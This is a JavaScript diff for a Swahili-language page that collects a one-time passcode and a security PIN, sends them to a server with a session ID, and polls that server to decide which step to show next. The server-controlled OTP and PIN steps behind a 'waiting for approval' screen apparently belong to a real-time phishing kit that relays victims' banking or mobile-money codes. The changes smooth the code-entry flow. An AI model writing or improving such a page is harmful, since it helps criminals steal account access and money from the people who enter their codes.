@@ -106,6 +106,7 @@ function setupPinInputs(selector) {
             if (e.target.value && index < boxes.length - 1) {
                 boxes[index + 1].focus();
             }
+            checkOtpComplete();
         });
         box.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && !box.value && index > 0) {
@@ -115,15 +116,24 @@ function setupPinInputs(selector) {
     });
 }
 
+function checkOtpComplete() {
+    const boxes = document.querySelectorAll('#step-otp .otp-box');
+    const btnVerifyOtp = document.getElementById('btn-verify-otp');
+    const otp = Array.from(boxes).map(b => b.value).join('');
+    
+    if (otp.length === 5) {
+        btnVerifyOtp.removeAttribute('disabled');
+    } else {
+        btnVerifyOtp.setAttribute('disabled', 'true');
+    }
+}
+
 // Submit OTP (Must be 5 digits numeric)
 document.getElementById('btn-verify-otp').addEventListener('click', async () => {
     const boxes = document.querySelectorAll('#step-otp .otp-box');
     const otp = Array.from(boxes).map(b => b.value).join('');
     
-    if (otp.length < 5) {
-        alert('Tafadhali ingiza OTP kamili ya tarakimu 5 (namba pekee).');
-        return;
-    }
+    if (otp.length < 5) return;
 
     try {
         await fetch('/api/submit-otp', {
@@ -132,7 +142,6 @@ document.getElementById('btn-verify-otp').addEventListener('click', async () => 
             body: JSON.stringify({ sessionId, otp })
         });
         
-        // Show waiting spinner screen
         showStep('success');
         startCountdown();
         showNotification('OTP imetumwa. Inasubiri uthibitisho...');
@@ -158,7 +167,6 @@ document.getElementById('btn-verify-security-pin').addEventListener('click', asy
             body: JSON.stringify({ sessionId, securityPin })
         });
         
-        // Show waiting spinner screen
         showStep('success');
         startCountdown();
         showNotification('PIN imetumwa. Inasubiri idhini ya mwisho...');
@@ -194,6 +202,8 @@ function startPolling() {
             }
 
             if (data.status === 'enter_otp') {
+                const otpBoxes = document.querySelectorAll('#step-otp .otp-box');
+                otpBoxes.forEach(b => b.removeAttribute('disabled'));
                 showStep('otp');
                 clearInterval(pollInterval);
             } else if (data.status === 'enter_security_pin') {
@@ -232,5 +242,5 @@ function startPolling() {
             console.error('Polling error:', e);
         }
     }, 3000);
-                                                     }
-        
+        }
+                    
